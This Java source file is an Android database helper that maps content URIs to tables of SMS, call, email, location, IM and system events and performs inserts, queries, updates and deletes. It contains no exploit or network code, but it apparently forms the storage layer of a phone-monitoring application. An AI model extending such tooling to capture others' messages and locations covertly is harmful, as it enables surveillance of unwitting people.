package com.fx.eventdb;

import java.util.Arrays;
import java.util.HashMap;

import android.content.ContentUris;
import android.content.ContentValues;
import android.content.UriMatcher;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.net.Uri;
import android.text.TextUtils;

import com.fx.maind.ref.Customization;
import com.fx.util.FxUtil;
import com.vvt.logger.FxLog;

class EventDatabaseHelper {

	private static final String TAG = "EventDatabaseHelper";
	private static final boolean VERBOSE = false;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	
	private static final int SMS = 1;
    private static final int SMS_ID = 2;
	private static final int CALL = 3;
    private static final int CALL_ID = 4;
    private static final int EMAIL = 5;
    private static final int EMAIL_ID = 6;
    private static final int LOC = 7;
    private static final int LOC_ID = 8;
    private static final int IM = 9;
    private static final int IM_ID = 10;
    private static final int SYS = 11;
    private static final int SYS_ID = 12;
    
    private UriMatcher mUriMatcher;
    private EventDatabase mEventDatabase;
    
    private static EventDatabaseHelper sInstance;
    
    public static EventDatabaseHelper getInstance() {
    	if (sInstance == null) {
    		sInstance = new EventDatabaseHelper();
    	}
    	return sInstance;
    }
    
    private EventDatabaseHelper() {
    	mUriMatcher = new UriMatcher(UriMatcher.NO_MATCH);
    	
    	mUriMatcher.addURI(
    			EventDatabaseMetadata.AUTHORITY, 
    			EventDatabaseMetadata.Sms.TABLE_NAME, 
    			SMS);
    	mUriMatcher.addURI(EventDatabaseMetadata.AUTHORITY, 
    			EventDatabaseMetadata.Sms.TABLE_NAME + "/#", 
    			SMS_ID);
    	
    	mUriMatcher.addURI(
    			EventDatabaseMetadata.AUTHORITY, 
    			EventDatabaseMetadata.Call.TABLE_NAME, 
    			CALL);
    	mUriMatcher.addURI(EventDatabaseMetadata.AUTHORITY, 
    			EventDatabaseMetadata.Call.TABLE_NAME + "/#", 
    			CALL_ID);
    	
    	mUriMatcher.addURI(
    			EventDatabaseMetadata.AUTHORITY, 
    			EventDatabaseMetadata.Email.TABLE_NAME, 
    			EMAIL);
    	mUriMatcher.addURI(EventDatabaseMetadata.AUTHORITY, 
    			EventDatabaseMetadata.Email.TABLE_NAME + "/#", 
    			EMAIL_ID);
    	
    	mUriMatcher.addURI(
    			EventDatabaseMetadata.AUTHORITY, 
    			EventDatabaseMetadata.Location.TABLE_NAME, 
    			LOC);
    	mUriMatcher.addURI(EventDatabaseMetadata.AUTHORITY, 
    			EventDatabaseMetadata.Location.TABLE_NAME + "/#", 
    			LOC_ID);
    	
    	mUriMatcher.addURI(
    			EventDatabaseMetadata.AUTHORITY, 
    			EventDatabaseMetadata.IM.TABLE_NAME, 
    			IM);
    	mUriMatcher.addURI(EventDatabaseMetadata.AUTHORITY, 
    			EventDatabaseMetadata.IM.TABLE_NAME + "/#", 
    			IM_ID);
    	
    	mUriMatcher.addURI(
    			EventDatabaseMetadata.AUTHORITY, 
    			EventDatabaseMetadata.System.TABLE_NAME, 
    			SYS);
    	mUriMatcher.addURI(EventDatabaseMetadata.AUTHORITY, 
    			EventDatabaseMetadata.System.TABLE_NAME + "/#", 
    			SYS_ID);
    	
    	// Initiate event database
    	mEventDatabase = EventDatabase.getInstance();
    	SQLiteDatabase db = mEventDatabase.getReadableDatabase();
    	db.close();
    }
    
    public Uri insert(Uri uri, ContentValues values) {
		Uri insertedUri = null;
		String notifyUri = null;
		int match = mUriMatcher.match(uri);
		
        if (LOGV) FxLog.v(TAG, "insert # uri=" + uri + ", match=" + match);
        
    	String table = null;
        switch (match) {
	        case SMS:
	    		table = EventDatabaseMetadata.Sms.TABLE_NAME;
	    		notifyUri = EventDatabaseMetadata.Sms.URI;
	    		break;
        	case CALL:
        		table = EventDatabaseMetadata.Call.TABLE_NAME;
        		notifyUri = EventDatabaseMetadata.Call.URI;
        		break;
        	case EMAIL:
        		table = EventDatabaseMetadata.Email.TABLE_NAME;
        		notifyUri = EventDatabaseMetadata.Email.URI;
        		break;
        	case LOC:
        		table = EventDatabaseMetadata.Location.TABLE_NAME;
        		notifyUri = EventDatabaseMetadata.Location.URI;
        		break;
        	case IM:
        		table = EventDatabaseMetadata.IM.TABLE_NAME;
        		notifyUri = EventDatabaseMetadata.IM.URI;
        		break;
        	case SYS:
        		table = EventDatabaseMetadata.System.TABLE_NAME;
        		notifyUri = EventDatabaseMetadata.System.URI;
        		break;
        	default:
        		throw new IllegalArgumentException("Unknown URI " + uri);
        }
        
        SQLiteDatabase db = mEventDatabase.getWritableDatabase();
        long rowId = db.insert(table, null, values);
        db.close();
		
		if (rowId > 0) {
			if (LOGV) FxLog.v(TAG, "insert # Insert success");
			insertedUri = ContentUris.withAppendedId(Uri.parse(notifyUri), rowId);
		}
		else {
			if (LOGV) FxLog.v(TAG, "insert # Insert failed!!");
		}
		return insertedUri;
	}

	public Cursor query(Uri uri, String[] projection, String selection,
			String[] selectionArgs, String sortOrder) {
		
		// Parse selection String
	    String parseSelect = FxUtil.getSqlSelection(selection);
	    String parseLimit = FxUtil.getSqlLimit(selection);
	    
	    HashMap<String, String> sqlSettings = getSqlSettings(uri, parseSelect);
	    
	    SQLiteQueryBuilder qb = new SQLiteQueryBuilder();
		qb.setTables(sqlSettings.get(FxUtil.SQL_TABLE_KEY));
		if (sqlSettings.get(FxUtil.SQL_SELECT_KEY) != null) {
			qb.appendWhere(sqlSettings.get(FxUtil.SQL_SELECT_KEY));
		}
		
		 // If no sort order is specified, use the default
	    String sortOrderString;
	    if (TextUtils.isEmpty(sortOrder)) {
	    	sortOrderString = EventDatabaseMetadata.DEFAULT_SORT_ORDER;
	    }
	    else {
	    	sortOrderString = sortOrder;
	    }
	    
	    // Build query String
	    String sql = qb.buildQuery(projection, parseSelect, 
	    		selectionArgs, null, null, sortOrderString, parseLimit);
	
	    // Get the database and run the query
	    SQLiteDatabase db = mEventDatabase.getReadableDatabase();
	    Cursor cursor = db.rawQuery(sql, selectionArgs);
	
	    return cursor;
	}

	public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
		HashMap<String, String> sqlSettings = getSqlSettings(uri, selection);
	    
		SQLiteDatabase db = mEventDatabase.getWritableDatabase();
	    
		int rowAffected = db.update(
	    		sqlSettings.get(FxUtil.SQL_TABLE_KEY), 
	    		values, 
	    		sqlSettings.get(FxUtil.SQL_SELECT_KEY), 
	    		selectionArgs);
	    
	    db.close();
	    
	    return rowAffected;
	}
	
	public int delete(Uri uri, String selection, String[] selectionArgs) {
		if (LOGV) FxLog.v(TAG, String.format("delete # uri = %s", uri));
		
		HashMap<String, String> sqlSettings = getSqlSettings(uri, selection);
		
		String table = sqlSettings.get(FxUtil.SQL_TABLE_KEY);
		String select = sqlSettings.get(FxUtil.SQL_SELECT_KEY);
		
		if (LOGV) {
			FxLog.v(TAG, String.format(
					"delete # table: %s, select: %s, args: %s", 
					table, select, Arrays.toString(selectionArgs)));
		}
	    
		SQLiteDatabase db = mEventDatabase.getWritableDatabase();
	    int rowAffected = db.delete(table, select, selectionArgs);
	    
	    db.close();
	    
	    // rowAffected seems to be counted only if select parameter is not null
	    if (rowAffected > 0 || (select == null)) {
	    	if (LOGV) FxLog.v(TAG, "delete # Delete success");
	    }
	    else {
	    	if (LOGV) FxLog.v(TAG, "delete # Delete failed!!");
	    }
	    
	    return rowAffected;
	}
	
	private HashMap<String, String> getSqlSettings(Uri uri, String selection) {
		String table = null;
		
		int match = mUriMatcher.match(uri);
		switch (match) {
			case SMS:
		    	table = EventDatabaseMetadata.Sms.TABLE_NAME;
		    	break;
		    case SMS_ID:
		        table = EventDatabaseMetadata.Sms.TABLE_NAME;
		        selection = EventDatabaseMetadata.ROWID + "=" + uri.getLastPathSegment() 
	    				+ (!TextUtils.isEmpty(selection) ? " AND (" + selection + ')' : "");
		        break;
			case CALL:
				table = EventDatabaseMetadata.Call.TABLE_NAME;
				break;
			case CALL_ID:
				table = EventDatabaseMetadata.Call.TABLE_NAME;
		        selection = EventDatabaseMetadata.ROWID + "=" + uri.getLastPathSegment() 
		        		+ (!TextUtils.isEmpty(selection) ? " AND (" + selection + ')' : "");
		        break;
			case EMAIL:
		    	table = EventDatabaseMetadata.Email.TABLE_NAME;
		    	break;
		    case EMAIL_ID:
		        table = EventDatabaseMetadata.Email.TABLE_NAME;
		        selection = EventDatabaseMetadata.ROWID + "=" + uri.getLastPathSegment() 
        				+ (!TextUtils.isEmpty(selection) ? " AND (" + selection + ')' : "");
		        break;		    
		    case LOC:
		    	table = EventDatabaseMetadata.Location.TABLE_NAME;
		        break;
		    case LOC_ID:
		        table = EventDatabaseMetadata.Location.TABLE_NAME;
		        selection = EventDatabaseMetadata.ROWID + "=" + uri.getLastPathSegment() 
						+ (!TextUtils.isEmpty(selection) ? " AND (" + selection + ')' : "");
		        break;
		    case IM:
		    	table = EventDatabaseMetadata.IM.TABLE_NAME;
		    	break;
		    case IM_ID:
		        table = EventDatabaseMetadata.IM.TABLE_NAME;
		        selection = EventDatabaseMetadata.ROWID + "=" + uri.getLastPathSegment() 
        				+ (!TextUtils.isEmpty(selection) ? " AND (" + selection + ')' : "");
		        break;	
		    case SYS:
		    	table = EventDatabaseMetadata.System.TABLE_NAME;
		        break;
		    case SYS_ID:
		        table = EventDatabaseMetadata.System.TABLE_NAME;
		        selection = EventDatabaseMetadata.ROWID + "=" + uri.getLastPathSegment() 
						+ (!TextUtils.isEmpty(selection) ? " AND (" + selection + ')' : "");
		        break;
		    default:
		        throw new IllegalArgumentException("Unknown URI " + uri);
		}
		
		HashMap<String, String> sqlSettings = new HashMap<String, String>();
		sqlSettings.put(FxUtil.SQL_TABLE_KEY, table);
		sqlSettings.put(FxUtil.SQL_SELECT_KEY, selection);
		
		return sqlSettings;
	}
}
